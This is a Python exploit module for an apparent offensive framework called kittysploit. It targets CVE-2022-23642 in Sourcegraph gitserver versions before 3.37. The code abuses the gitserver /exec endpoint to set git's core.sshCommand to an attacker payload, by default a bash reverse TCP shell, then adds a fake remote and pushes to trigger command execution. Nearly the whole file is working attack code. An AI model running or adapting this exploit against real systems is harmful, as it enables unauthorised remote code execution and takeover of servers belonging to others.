from kittysploit import *
from lib.protocols.http.http_client import Http_client

class Module(Exploit, Http_client):

    __info__ = {
            "name": "Sourcegraph Gitserver 3.36.3 Rce",
            "description": "Sourcegraph is a code search and navigation engine. "\
                            "Sourcegraph prior to version 3.37 is vulnerable to remote "\
                            "code execution in the `gitserver` service. The service acts "\
                            "as a git exec proxy, and fails to properly restrict calling `git config`. "\
                            "This allows an attacker to set the git `core.sshCommand` option, which sets "\
                            "git to use the specified command instead of ssh when they need to connect to a remote system. "\
                            "Exploitation of this vulnerability depends on how Sourcegraph is deployed. "\
                            "An attacker able to make HTTP requests to internal services like gitserver is able to exploit it. "\
                            "This issue is patched in Sourcegraph version 3.37. As a workaround, ensure that requests to gitserver are properly protected.",
            "cve": "2022-23642",
            "payload": {
                "default": "payloads/singles/cmd/unix/bash_reverse_tcp",
                "arch": [Arch.X86, Arch.X64],
                "platform": Platform.UNIX,
                "category": PayloadCategory.SINGLE,
                }			
        }

    gitserver = OptString("127.0.0.1", "Sourcegraph gitserver IP address", "yes")
    existing_git = OptString("github.com/example/hello_world", "Link of existing repository in target Sourcegraph", "yes")

    def run(self):

        data = {
            "Repo" : self.existing_git,
            "Args" : [
                "config",
                "core.sshCommand",
                self.payload
            ]
        }


        r = self.http_request(method="GET",
                                path="/exec",
                                json=data)
        if not r:
            print_error("Failed to connect to Sourcegraph gitserver")
            return

        if len(r.text) > 0:
            self.not_vulnerable()
            return
        data = {
            "Repo" : self.existing_git,
            "Args" : [
                "remote",
                "add",
                "origin",
                "git@lolololz:foo/bar.git"
            ]
        }

        r = self.http_request(method="GET",
                                path="/exec",
                                json=data)
        if not r:
            print_error("Failed to connect to Sourcegraph gitserver")
            return

        if len(r.text) > 0:
            self.not_vulnerable()
            return

        data = {
            "Repo" : self.existing_git,
            "Args" : [
                "push",
                "origin",
                "master"
            ]
        }

        r = self.http_request(method="GET",
                            path="/exec",
                            json=data)